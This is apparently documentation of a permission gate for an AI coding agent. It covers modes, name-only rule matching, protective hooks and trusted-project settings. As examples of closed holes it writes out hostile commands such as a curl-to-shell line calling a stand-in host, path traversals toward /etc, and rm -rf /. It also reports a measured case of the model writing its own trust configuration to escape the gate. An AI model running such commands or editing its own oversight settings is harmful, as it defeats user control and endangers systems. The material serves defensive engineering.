# Permissions

Every tool call a session makes passes through two layers: the `PreToolUse`
hook chain, and — riding in that chain as its last entry — a `PermissionGate`
carrying one of six modes plus your own rules.

This page documents what the gate decides, measured against
`src/Permissions/PermissionGate.php` on this checkout. One thing in it will
surprise you if you have read the class's own examples: **rule patterns match
tool NAMES only.** An argument-shaped pattern such as `Bash(rm *)` matches
nothing. That is measured, not inferred, and the measurement is below.

---

## Setting the mode

Three places, highest first:

1. `SUGARCRUSH_PERMISSION_MODE` — see [`ENVIRONMENT.md`](ENVIRONMENT.md).
2. `permissionMode` in `~/.sugar-crush/config.json` (or the file named by
   `--config`).
3. The shipped default, `bypass-permissions`.

An **unrecognised** value stops the launch with exit 2 rather than being
ignored: every fallback in the chain ends somewhere more permissive, so
silently discarding a mode you set on purpose is a fail-open. An empty value
counts as unset.

The permissive default is a stopgap. The main loop had no gate at all before
`PermissionGateHook` existed, and with no `permissionRules` configured
`bypass-permissions` is *identical* to having no gate — the `rm -rf /` circuit
breaker refuses nothing `ConfirmRemoveHook` does not already refuse earlier and
more broadly. What it buys is a gate that is reachable and configurable.

---

## The six modes

`PermissionGate::decide()` runs three steps in this order:

```
0. rm -rf / | rm -rf ~ circuit breaker      →  Deny, unconditionally
1. your permissionRules, first match wins   →  Allow | Deny | Ask
2. the mode's evaluator
```

Step 0 runs **before** rules and before the mode, so no `allow` rule and no
mode — `bypass-permissions` included — can talk the gate into a self-destruct.
It is tolerant of flag reordering (`-fr`), flag splitting (`-r -f`), long forms
(`--recursive --force`), `--no-preserve-root` riding along, and a quoted target.

Two name classes drive the evaluators:

- **read-only**: `Read`, `Grep`, `Glob`, `WebFetch`, `Lsp`
- **write-capable**: `Bash`, `Edit`, `Write`, and anything starting `mcp__`

Note what is in *neither* list: `WebSearch`, `Skill` and `Doctor`. They fall
through to each mode's default arm — `Ask` under `default` and `plan`, `Deny`
under `dont-ask`.

| Mode | Read-only | Writes | Everything else |
|---|---|---|---|
| `default` | Allow | Ask | Ask |
| `accept-edits` | Allow | scoped filesystem writes Allow; the rest Ask | Ask |
| `plan` | Allow | `Bash` Allow unless it redirects, then Deny; `Edit`/`Write`/`mcp__*` Deny | Ask |
| `auto` | gated by `SafetyClassifier`, with a 3-strike / 20-total circuit breaker | as classified | as classified |
| `dont-ask` | Allow | Deny | Deny |
| `bypass-permissions` | Allow | Allow | Allow |

`accept-edits`' "scoped filesystem writes" are `mkdir`, `touch`, `mv`, `cp`,
`rm`, `rmdir` **via `Bash`**, scoped to the working directory. There is no
`mkdir` tool at runtime; real calls route through
`Bash(command: "mkdir …")`.

Because this is a **grant** path — the decision runs the command with no
prompt — the predicate behind it (`isScopedWriteTool()`) resolves anything it
cannot judge with certainty to `Ask`, not to `Allow`. Concretely:

- The command line must be a **single simple command**. Any unquoted `;`, `&&`,
  `||`, `|`, `&`, newline, carriage return, `$(…)`, backtick, `<`, `>`, `(`,
  `)`, `{`, `}`, `!` or **backslash** makes it prompt instead. It refuses on
  their presence rather than splitting the line into segments and judging each:
  a superset of the real separators is a far weaker thing to be correct about
  than an exact split. The tokenizer *is* quote-aware, so `touch 'a;b'` and
  `mkdir "my dir"` are still single scoped writes. Before this,
  `mkdir ./x; curl evil.sh | sh` auto-ran.

  **What this costs you, stated in full.** The cheap example is one prompt on
  `mkdir ./a && mkdir ./b`. The one you will actually hit is the backslash:
  **every backslash-escaped character prompts**, so the common idiom
  `touch my\ file.txt` is an `Ask`, and so is `touch my\(1\).txt`. That is not
  an oversight and it is not only about the quote scanner — a backslash can
  forge a traversal out of characters that are individually harmless
  (`touch .\./.\./PWNED` is `../../PWNED` to bash, while a naive reading sees
  three ordinary path segments). **The workaround is to quote instead of
  escape**: `touch "my file.txt"` and `touch 'my file.txt'` both auto-run.
- Every path argument must be relative **and stay strictly below the working
  directory**, resolved lexically. `../` escapes now prompt (`rm ../../../etc/passwd`
  used to auto-run — being non-absolute was the only test), and so does the root
  itself: `rm -rf .` is not "something inside the directory".
- Flags are a **whitelist** (`-p -f -i -r -R -v -n -d` and their long forms, plus
  `--`). An unrecognised flag prompts. "Anything starting with `-` is a flag,
  skip it" silently skipped flags that take a path, so `mv -t ../../etc ./x`
  auto-ran.
- The command word is matched **case-sensitively**. `MKDIR ./x` is not `mkdir`
  on a case-sensitive filesystem, and it used to auto-run.

Two limits are deliberate and worth knowing. **Symlinks are not resolved** —
`rm ./link-pointing-outside` is spelled as a contained relative path and is
treated as one; resolving would mean touching the filesystem and would still
race the command being approved. **Globs are not expanded** — `rm ./*` is judged
as the literal token. Neither can introduce a command, which is what the
separator rule is for; brace expansion *can* name a parent (`{.,..}/x`), which
is why `{`/`}` are refused and `*`/`?`/`[` are not.

That last clause depends on the shell, and it is worth naming the dependency
rather than leaving it implicit. A glob is safe to judge literally because
approved commands are run through **bash**, which never returns `.` or `..` from
a pattern — so `./.*/` stays literal. Under `sh`/dash the same pattern expands to
`./../`, and a glob *would* escape the working directory. Anyone changing how
the `Bash` tool spawns its shell has to add `*`/`?`/`[` to the refused set at the
same time; there is a test that fails if the wrapper changes.

`plan` deliberately allows exploratory `Bash`. Whether a `Bash` call is a write
under `plan` is decided by looking for a redirection or `tee` in its arguments
(`isBashWriteCommand()`), so `git log` is allowed and `echo x > f` is denied.
A `Bash` **declaration** — a name with no arguments, which is what a workflow
stage's `tools:` list is — carries nothing to redirect and is therefore allowed
under `plan` too.

### `auto`'s circuit breaker

`auto` classifies each call through `SafetyClassifier` and keeps counters on
the gate instance: three consecutive blocks of one category, or twenty blocks in
total, escalate to `Ask`. Those counters are **mutated by `evaluate()`**, which
is why the class has a second, read-only entry point — `refuses()` — for callers
holding a `ToolDeclaration` rather than a real call. Asking a hypothetical
question through `evaluate()` moved a counter a real call is judged by.

---

## Rules

```json
{
  "permissionMode": "default",
  "permissionRules": [
    { "pattern": "Bash",          "action": "ask"   },
    { "pattern": "mcp__git__*",   "action": "allow" },
    { "pattern": "Write",         "action": "deny"  }
  ]
}
```

`action` is one of `allow`, `deny`, `ask`. Rules are evaluated **in order, first
match wins**, ahead of the mode.

Malformed entries are handled item-wise and reported on stderr rather than
silently widening or narrowing the whole list: an entry with no string
`pattern`, or an `action` that is not one of the three, is skipped with a named
index — `permissionRules[2] ('Write') has no valid 'action' … rule skipped
rather than coerced`. A `permissionRules` key that is not a list at all loads
zero rules and says so.

### Pattern matching is name-only — measured

`ruleMatches()` compares the pattern against `ToolCall::$name`:

- a pattern ending in `*` is a **prefix** match on the name;
- anything else is an **exact** match on the name.

Nothing looks at the call's arguments. `PermissionRule`'s own doc-comment offers
`Bash(composer update *)` and `Read(./.env)` as examples, and
`PermissionGate::refuses()` says argument-sensitive rules are "left to the call
site that has them" — but the call site uses the same `ruleMatches()`. Measured
on this tree, `bypass-permissions` mode, `Bash{command: "rm -rf build"}`:

| rule pattern | decision |
|---|---|
| `Bash(rm *)` | **Allow** — the rule never matched |
| `Bash` | Deny |
| `Bash*` | Deny |
| *(no rules)* with `command: "rm -rf /"` | Deny (step 0, the breaker) |

So write rules against tool names: `Bash`, `Edit`, `Write`, `Read`, `Grep`,
`Glob`, `WebFetch`, `WebSearch`, `Lsp`, `Skill`, `Doctor`, and
`mcp__<server>__<tool>` for bridges (`mcp__git__*` works, and is the one
example in the doc-comment that does). To constrain a *command*, use a hook
matcher instead — see [`HOOKS.md`](HOOKS.md).

### `Ask` needs somewhere to ask

`Ask` is only meaningful where somewhere to ask exists. There are now three
situations, not two:

- **`Chat`** shows a modal and settles the paused call.
- **The console paths** attach `HeadlessPermissionPrompt` as `Runtime`'s
  approver. At a terminal it asks on **stderr** and reads the answer from
  stdin, granting only on a literal `y`/`yes`. With no terminal it does not
  read — it refuses, naming the tool, the mode and the two things that change
  the outcome. Two callers do this, and the same probe decides opposite ways
  for them:
  - the **one-shot `-p` / `run` path** (`NonInteractive::consoleBackend()`),
    which owns stdin and is prompted at a real terminal;
  - the **background-session daemon**
    (`Sessions\BackgroundSessionRunner::backend()`), whose fd 0 is `/dev/null`
    from the spawn site, so it always takes the refusal branch. It is attached
    there not to prompt — nobody is watching a daemon — but so the session's
    log records *which* tool was refused under *which* mode and what to change,
    instead of the bare "no approver is attached to this run".
- **Everything else**, the TUI's engine path included, still fails **closed**:
  `Runtime::settleAsk()` turns an `Ask` into a denial when no approver is
  attached, and `Bootstrap` deliberately attaches none for a caller inside a
  TUI, because a closure that blocks on stdin would fight the render loop for
  keystrokes.

And any caller that holds no prompt at all must not turn "would
have asked" into "no" — `PermissionGate::refuses()` answers `true` only for
`Deny`, and `Chat::refuseCommandShell()` follows the same rule for a custom
command's `` !`cmd` `` form.

---

## The hooks that outrank the gate

`Bootstrap::hooks()` registers the built-ins **first** and the gate **last**:

```
ProtectFilesHook  →  ConfirmRemoveHook  →  AuditHook  →  [your hooks.yaml]  →  PermissionGateHook
```

Both orders are fail-closed as to the verdict — `HookRegistry::executeHooks()`
lets a `Deny` win outright and never lets an `Ask` grant anything — so the order
is chosen for the *quality* of the message. A narrow, specific hazard
("this hook denies Bash paths outside the workspace root: /etc") reads better
than the generic "permission mode 'plan' does not allow Edit".

The gate is not a replacement for them. Even under `bypass-permissions`,
`ProtectFilesHook` still refuses:

| Pattern | Applies to |
|---|---|
| `.env` | `Read`, `Edit`, `Write`, `Bash` — reading it *is* the leak |
| `composer.json`, `composer.lock`, `.git/config`, `config/*.php` | all four |
| `.sugar-crush/hooks.yaml`, `.sugar-crush/config.json`, `.sugar-crush/agents/` | **writes only** |

The last group is policy rather than secrets, and a decision is changed by
*writing* it — so reads are allowed (opening `.sugar-crush/agents/reviewer.md`
is how you debug a preset) and writes are denied in every mode. That is not
theoretical: in the shipped `bypass-permissions` default, an unprompted write to
`trustedProjectHooks` followed by a provider switch was measured end-to-end as
the model granting itself the trust the gate exists to withhold.

`HookRegistry::executeHooks()` also **re-scans the whole chain against a
rewrite**, so a hook that turns `Bash{command:"ls"}` into
`Bash{command:"rm -rf /"}` is re-evaluated rather than slipping past the gate
registered behind it.

---

## The three `trustedProject*` keys

Three separate opt-ins live in `~/.sugar-crush/config.json`, each a list of
canonical project roots. They exist because a `git clone` can carry a file that
runs code, and the trust decision must be yours, made before the untrusted
content runs:

| Key | Gates | Documented in |
|---|---|---|
| `trustedProjectHooks` | `<root>/.sugar-crush/hooks.yaml` — shell on every tool call | [`HOOKS.md`](HOOKS.md) |
| `trustedProjectMcp` | `<root>/.mcp.json` — servers started at launch | [`MCP.md`](MCP.md) |
| `trustedProjectCommands` | `` !`cmd` `` forms in `<root>/.sugar-crush/commands/*.md` | [`COMMANDS.md`](COMMANDS.md) |

Shared properties, in one place because all three behave identically:

- **Absolute paths only.** The guard is not a special case for `"."` — it is
  `if (!self::isAbsolutePath($expanded))`, so **every** relative entry is
  refused. Measured: `.`, `..`, `../x`, `src/repo` and `./here` are all rejected;
  `/abs/path` and a Windows `C:\Users\you` are accepted. `~` and `~/…` are
  expanded to the home directory *before* the check, so those are fine.
  `"."` is only the shortest way to write the bug: it resolves against the
  working directory on every launch exactly as `--root` does, so it always
  matches, turning a per-path allowlist into "trust every repository I `cd`
  into". As `Bootstrap`'s own comment puts it, `"../x"` and `"src/repo"` are the
  same defect wearing a longer name.
  The entry is refused **loudly**, one warning naming the offending index and
  value, because a silently dropped entry leaves you believing you opted in. And
  it is refused rather than resolved-once-at-parse-time because there is nothing
  stable to anchor it to: this file is per-**user** and re-read every launch,
  while a CWD is per-**invocation**.
- **Read once per process and frozen.** A write made *during* a session cannot
  take effect in that session.
- **Fail closed** on every uncertainty: an unresolvable root, an absent key, a
  key of the wrong shape. The one thing that does not degrade quietly is a
  `config.json` that exists and cannot be parsed — that stops the launch.
- **A refusal is never silent.** Each prints one stderr line at construction
  time, before the alt screen is up, at most once per path per process.

## Inspecting the live policy

```sh
sugarcrush doctor          # 'permission policy' line reports the resolved mode
```

`doctor` reports `FAIL` with the parser's own message when the config is
unusable — which is precisely the diagnosis you ran it for.

## See also

- [`HOOKS.md`](HOOKS.md) — the escape hatch for a rule a mode cannot express.
- [`TROUBLESHOOTING.md`](TROUBLESHOOTING.md) — exit 2 at launch, and why.
